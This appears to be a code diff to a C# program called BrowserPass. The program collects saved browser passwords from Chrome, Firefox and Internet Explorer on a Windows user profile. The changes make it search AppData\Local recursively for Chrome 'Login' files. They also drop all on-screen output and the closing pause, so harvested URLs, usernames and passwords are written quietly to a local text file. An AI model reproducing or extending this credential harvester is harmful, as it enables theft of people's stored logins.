@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Diagnostics;
 
 namespace BrowserPass
 {
@@ -8,28 +9,21 @@ namespace BrowserPass
     class Program
     {
 
-
         static void GetAllFolderInPath(string path, List<string> list)
         {
             DirectoryInfo dx = new DirectoryInfo(path);//Assuming Test is your Folder
             DirectoryInfo[] diArr = dx.GetDirectories();
-            // Display the names of the directories.
-
+            if (diArr.Length == 0)
+                return;
             foreach (DirectoryInfo dri in diArr)
                 try
                 {
                     GetAllFolderInPath(path + "\\" + dri.Name, list);
-
                     list.Add(path + "\\" + dri.Name);
                 }
-
                 catch
                 {
-                    Console.WriteLine("không tìm thấy  " + path + "\\" + dri.Name);
                 }
-
-            if (diArr.Length == 0)
-                return;
         }
 
 
@@ -40,19 +34,15 @@ namespace BrowserPass
             {
                 try
                 {
-                    DirectoryInfo dx = new DirectoryInfo(@"C:\Users\thang\AppData\Local\Google\Chrome\User Data\Default");
+                    DirectoryInfo dx = new DirectoryInfo(@path);
                     FileInfo[] Files = dx.GetFiles("*"); //Getting Text files
-
                     foreach (FileInfo file in Files)
-                    {
-                        if (file.Extension == "" &&listFile.Contains(file.FullName)==false)
-                            listFile.Add(file.FullName);
-                    }
-
+                        if (file.Extension == "" || file.Extension == ".json")
+                            if (listFile.Contains(file.FullName) == false && file.Name.Contains("Login"))
+                                listFile.Add(file.FullName);
                 }
                 catch
                 {
-
                 }
 
             }
@@ -61,47 +51,36 @@ namespace BrowserPass
 
         static void Main(string[] args)
         {
+            Stopwatch timer = new Stopwatch();
+            timer.Start();
             List<IPassReader> readers = new List<IPassReader>();
             DirectoryInfo dx = new DirectoryInfo(@"C:\Users\thang\AppData\Local");//Assuming Test is your Folder
             FileInfo[] Files = dx.GetFiles(); //Getting Text files
-            string str = "";
-            foreach (FileInfo file in Files)
-            {
-                str += " " + file.Name;
-                Console.WriteLine(str);
-            }
-            //DirectoryInfo di = new DirectoryInfo("c:\\");
-
-            // Get a reference to each directory in that directory.
-
-
             var path = @"C:\Users\thang\AppData\Local";
             var listFolder = new List<string>();
             GetAllFolderInPath(path, listFolder);
             var xx = GetAllFileInFolder(listFolder);
             var chrome = new ChromePassReader();
-            foreach (var d in chrome.ReadPasswordsList(xx))
-                Console.WriteLine($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
-
+            chrome.ReadPasswordsList(xx);
+            timer.Stop();
+            Console.WriteLine(timer.ElapsedMilliseconds.ToString());
+            timer.Start();
             readers.Add(chrome);
-
             readers.Add(new FirefoxPassReader());
             readers.Add(new IE10PassReader());
             foreach (var reader in readers)
             {
-                Console.WriteLine($"== {reader.BrowserName} ============================================ ");
                 try
                 {
                     foreach (var d in reader.ReadPasswords())
-                        Console.WriteLine($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
+                        File.AppendAllText("user_.txt","/n" + d + "/n");
                 }
-                catch (Exception ex)
+                catch 
                 {
-                    Console.WriteLine($"Error reading {reader.BrowserName} passwords: " + ex.Message);
                 }
             }
-            Console.ReadKey();
-            Console.ReadLine();
+            timer.Stop();
+            Console.WriteLine(timer.ElapsedMilliseconds);
         }
     }
 }
